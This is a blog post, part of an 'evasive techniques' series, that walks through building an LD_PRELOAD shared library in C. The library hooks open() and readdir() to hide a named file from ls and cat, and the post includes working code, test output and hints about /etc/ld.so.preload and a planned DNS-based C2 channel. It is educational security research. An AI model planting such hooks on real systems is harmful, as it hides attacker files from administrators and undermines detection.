<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) | 0x73796C31</title><meta name=keywords content><meta name=description content="Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call &ldquo;journey post&rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like <journey> so that you can skip it if you are in a hurry."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)"><meta property="og:description" content="Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call &ldquo;journey post&rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like <journey> so that you can skip it if you are in a hurry."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-10-04T21:45:03+03:00"><meta property="article:modified_time" content="2022-10-04T21:45:03+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)"><meta name=twitter:description content="Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call &ldquo;journey post&rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like <journey> so that you can skip it if you are in a hurry."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://sy1.sh/posts/"},{"@type":"ListItem","position":3,"name":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)","item":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)","name":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)","description":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call \u0026ldquo;journey post\u0026rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.","keywords":[],"articleBody":" Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call “journey post”, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like so that you can skip it if you are in a hurry.\nOverview In the last post I’ve described how I hid a file from all the sys calls that are using readdir. In this post I will try to hide it from the cat command. Let’s first examine/reverse engineer how the cat command works internally.\nNaturally I would start with a simple strace which will trace the system calls and signals that the command uses.\n$ which cat /usr/bin/cat $ strace /usr/bin/cat syl.lys execve(\"/usr/bin/cat\", [\"/usr/bin/cat\", \"syl.lys\"], 0x7ffca9c17508 /* 68 vars */) = 0 ... access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet ... openat(AT_FDCWD, \"syl.lys\", O_RDONLY) = 3 The most interesting sys call in the output is openat so lets see the source code of openat.c. Here we can see the char const *file that variable is what holds our filename (look at the strace output). After that, I followed our steps in the last post by implementing a function with the same signature and wrapping the original one.\nAfter a few tries I was quick to realize that there is some issue. The wrapper that I’ve implemented didn’t work, or at least didn’t work all the time. I’ve tested it out with a simple program that would just call it and in there it worked, I didn’t quite get why it does what it does but I found the following discussions:\nintercepting the openat() system call for GNU tar How to find out what functions to intercept with LD_PRELOAD? As it turns out (my best guess) the sys call that I am trying to override openat is probably not the one that the cat uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has *open* in it.\nI found on line 686 a call to the open. An important note here is that this open call here is not the sys call but the call in the std lib which will call the related system call for us. So I’ve decided to change my approach and override the open function instead.\nHow does the open function work? I wouldn’t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.\nLet’s start by copying the signature of the open function and wrap it.\nstatic int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { original_open = dlsym(RTLD_NEXT, \"open\"); return original_open(filename, flags); } In this code block I’ve wrapped the original open function with our implementation of the open function. What is left now is to add our “malicious” part to it.\nif (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; // Setting up the error to be ERROR NO ENTRY(ENOENT) return -1; // Returning -1 (failure) } And lastly all together\nintercept_open.c\n#define _GNU_SOURCE #include #include #include #include #include #define MALICIOUS_FILE \"syl.lys\" static int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \"open\"); return original_open(filename, flags); } Let’s see if its working…\n$ ls intercept_open.so syl.lys $ LD_PRELOAD=./intercept_open.so cat syl.lys cat: syl.lys: No such file or directory As you can see the cat command returns No such file or directory which is exactly what we are aiming for.\nCombining it with our readdir We created a malicious open function that wraps the original one from the standard lib, lets now combine it with the readdir from the previous post into a single shared object.\nmalicious.c\n#define _GNU_SOURCE #include #include #include #include #include #include #define MALICIOUS_FILE \"syl.lys\" static int (*original_open)(const char *filename, int flags, ...) = NULL; struct dirent *(*original_readdir)(DIR *dirp) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \"open\"); return original_open(filename, flags); } struct dirent *readdir(DIR *dirp) { struct dirent *ret; original_readdir = dlsym(RTLD_NEXT, \"readdir\"); while((ret = original_readdir(dirp))) { if(strstr(ret-\u003ed_name, MALICIOUS_FILE) == 0) break; } return ret; } Let’s test it out, supposedly we shouldn’t get entries from ls and cat.\n$ touch syl.lys $ ls intercept_open.c malicious.c malicious.so syl.lys $ export LD_PRELOAD=./malicious.so $ ls intercept_open.c malicious.c malicious.so README.md $ cat syl.lys cat: syl.lys: No such file or directory End With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).\nFull Source Code\nResources This post wouldn’t be possible without:\nhttps://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html https://linux.die.net/man/2/openat And some kind StackOverflow users! ","wordCount":"894","inLanguage":"en","datePublished":"2022-10-04T21:45:03+03:00","dateModified":"2022-10-04T21:45:03+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>CV</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/posts/>Posts</a></div><h1 class=post-title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)</h1><div class=post-meta><span title='2022-10-04 21:45:03 +0300 +0300'>October 4, 2022</span>&nbsp;·&nbsp;5 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><ul><li><a href=#series aria-label=Series>Series</a></li><li><a href=#journey-post aria-label="Journey Post">Journey Post</a></li><li><a href=#overview aria-label=Overview>Overview</a></li><li><a href=#combining-it-with-our-readdir aria-label="Combining it with our readdir">Combining it with our <code>readdir</code></a></li></ul><li><a href=#end aria-label=End>End</a></li><li><a href=#resources aria-label=Resources>Resources</a></li></ul></div></details></div><div class=post-content><p><img loading=lazy src=/dyn-link-hijack/dynlinkhijack.png alt=cover></p><h2 id=series>Series<a hidden class=anchor aria-hidden=true href=#series>#</a></h2><ol><li><a href=https://sy1.sh/posts/dynamic-linker-hijacking-experiments/>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)</a></li><li>(this one)</li><li><a href=https://sy1.sh/posts/dns-c2-communcation/>Using DNS as C2 Communication - Evasive Techniques (Part 3)</a></li></ol><h2 id=journey-post>Journey Post<a hidden class=anchor aria-hidden=true href=#journey-post>#</a></h2><p>This post is a something that I call &ldquo;journey post&rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like <code>&lt;journey></code> so that you can skip it if you are in a hurry.</p><hr><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>In the last post I&rsquo;ve described how I hid a file from all the sys calls that are using <code>readdir</code>. In this post I will try to hide it from the <code>cat</code> command. Let&rsquo;s first examine/reverse engineer how the <code>cat</code> command works internally.</p><p>Naturally I would start with a simple <a href=https://man7.org/linux/man-pages/man1/strace.1.html>strace</a> which will trace the system calls and signals that the command uses.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> which cat
</span></span><span class=line><span class=cl><span class=go>/usr/bin/cat
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> strace /usr/bin/cat syl.lys
</span></span><span class=line><span class=cl><span class=go>execve(&#34;/usr/bin/cat&#34;, [&#34;/usr/bin/cat&#34;, &#34;syl.lys&#34;], 0x7ffca9c17508 /* 68 vars */) = 0
</span></span></span><span class=line><span class=cl><span class=go>...
</span></span></span><span class=line><span class=cl><span class=go>access(&#34;/etc/ld.so.preload&#34;, R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet
</span></span></span><span class=line><span class=cl><span class=go>...
</span></span></span><span class=line><span class=cl><span class=go>openat(AT_FDCWD, &#34;syl.lys&#34;, O_RDONLY) = 3
</span></span></span></code></pre></div><p>The most interesting sys call in the output is <code>openat</code> so lets see the source code of <a href=https://github.com/coreutils/gnulib/blob/master/lib/openat.c#L182>openat.c</a>. Here we can see the <code>char const *file</code> that variable is what holds our filename (look at the <code>strace</code> output). After that, I followed our steps in the last <a href=dynamic-linker-hijacking-experiments>post</a> by implementing a function with the same signature and wrapping the original one.</p><p><code>&lt;journey></code></p><p>After a few tries I was quick to realize that there is some issue. The wrapper that I&rsquo;ve implemented didn&rsquo;t work, or at least didn&rsquo;t work all the time. I&rsquo;ve tested it out with a simple program that would just call it and in there it worked, I didn&rsquo;t quite get why it does what it does but I found the following discussions:</p><ul><li><a href=https://stackoverflow.com/questions/9161116/intercepting-the-openat-system-call-for-gnu-tar>intercepting the openat() system call for GNU tar</a></li><li><a href=https://stackoverflow.com/questions/49314057/how-to-find-out-what-functions-to-intercept-with-ld-preload>How to find out what functions to intercept with LD_PRELOAD?</a></li></ul><p>As it turns out (my best guess) the sys call that I am trying to override <code>openat</code> is probably not the one that the <code>cat</code> uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has <code>*open*</code> in it.</p><p>I found on <a href=https://github.com/coreutils/coreutils/blob/master/src/cat.c#L686>line 686</a> a call to the <code>open</code>. An important note here is that this <code>open</code> call here is not the sys call but the call in the std lib which will call the related system call for us. So I&rsquo;ve decided to change my approach and override the <code>open</code> function instead.</p><p><code>&lt;/journey></code></p><p>How does the <a href=https://man7.org/linux/man-pages/man2/open.2.html>open function</a> work? I wouldn&rsquo;t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.</p><p>Let&rsquo;s start by copying the signature of the <a href=https://github.com/coreutils/gnulib/blob/master/lib/open.c#L59>open function</a> and wrap it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=nf>int</span> <span class=p>(</span><span class=o>*</span><span class=n>original_open</span><span class=p>)(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=p>...)</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>open</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=p>...)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>original_open</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>original_open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In this code block I&rsquo;ve wrapped the original <code>open</code> function with our implementation of the <code>open</code> function. What is left now is to add our &ldquo;malicious&rdquo; part to it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>MALICIOUS_FILE</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>errno</span> <span class=o>=</span> <span class=n>ENOENT</span><span class=p>;</span> <span class=c1>// Setting up the error to be ERROR NO ENTRY(ENOENT)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=c1>// Returning -1 (failure)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>And lastly all together</p><p><a href=https://github.com/syrull/evasive_techniques/blob/main/Part_2_open/intercept_open.c>intercept_open.c</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define MALICIOUS_FILE &#34;syl.lys&#34;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=nf>int</span> <span class=p>(</span><span class=o>*</span><span class=n>original_open</span><span class=p>)(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=p>...)</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>open</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=p>...)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>   
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>MALICIOUS_FILE</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>errno</span> <span class=o>=</span> <span class=n>ENOENT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>original_open</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>original_open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Let&rsquo;s see if its working&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> ls
</span></span><span class=line><span class=cl><span class=go>intercept_open.so  syl.lys
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> <span class=nv>LD_PRELOAD</span><span class=o>=</span>./intercept_open.so cat syl.lys
</span></span><span class=line><span class=cl><span class=go>cat: syl.lys: No such file or directory
</span></span></span></code></pre></div><p>As you can see the <code>cat</code> command returns <code>No such file or directory</code> which is exactly what we are aiming for.</p><h2 id=combining-it-with-our-readdir>Combining it with our <code>readdir</code><a hidden class=anchor aria-hidden=true href=#combining-it-with-our-readdir>#</a></h2><p>We created a malicious <code>open</code> function that wraps the original one from the standard lib, lets now combine it with the <code>readdir</code> from the previous post into a single shared object.</p><p><a href=https://github.com/syrull/evasive_techniques/blob/main/Part_2_open/malicious.c>malicious.c</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dirent.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define MALICIOUS_FILE &#34;syl.lys&#34;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=nf>int</span> <span class=p>(</span><span class=o>*</span><span class=n>original_open</span><span class=p>)(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=p>...)</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>original_readdir</span><span class=p>)(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>)</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>open</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=p>...)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>MALICIOUS_FILE</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>errno</span> <span class=o>=</span> <span class=n>ENOENT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>original_open</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>original_open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=nf>readdir</span><span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>original_readdir</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;readdir&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>((</span><span class=n>ret</span> <span class=o>=</span> <span class=nf>original_readdir</span><span class=p>(</span><span class=n>dirp</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nf>strstr</span><span class=p>(</span><span class=n>ret</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=n>MALICIOUS_FILE</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Let&rsquo;s test it out, supposedly we shouldn&rsquo;t get entries from <code>ls</code> and <code>cat</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> touch syl.lys
</span></span><span class=line><span class=cl><span class=gp>$</span> ls
</span></span><span class=line><span class=cl><span class=go>intercept_open.c  malicious.c  malicious.so  syl.lys
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> <span class=nb>export</span> <span class=nv>LD_PRELOAD</span><span class=o>=</span>./malicious.so
</span></span><span class=line><span class=cl><span class=gp>$</span> ls
</span></span><span class=line><span class=cl><span class=go>intercept_open.c  malicious.c  malicious.so  README.md
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> cat syl.lys
</span></span><span class=line><span class=cl><span class=go>cat: syl.lys: No such file or directory
</span></span></span></code></pre></div><h1 id=end>End<a hidden class=anchor aria-hidden=true href=#end>#</a></h1><p>With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).</p><p><a href=https://github.com/syrull/evasive_techniques/tree/main/Part_2_open>Full Source Code</a></p><h1 id=resources>Resources<a hidden class=anchor aria-hidden=true href=#resources>#</a></h1><p>This post wouldn&rsquo;t be possible without:</p><ul><li><a href=https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html>https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html</a></li><li><a href=https://linux.die.net/man/2/openat>https://linux.die.net/man/2/openat</a></li><li>And some kind StackOverflow users!</li></ul></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const 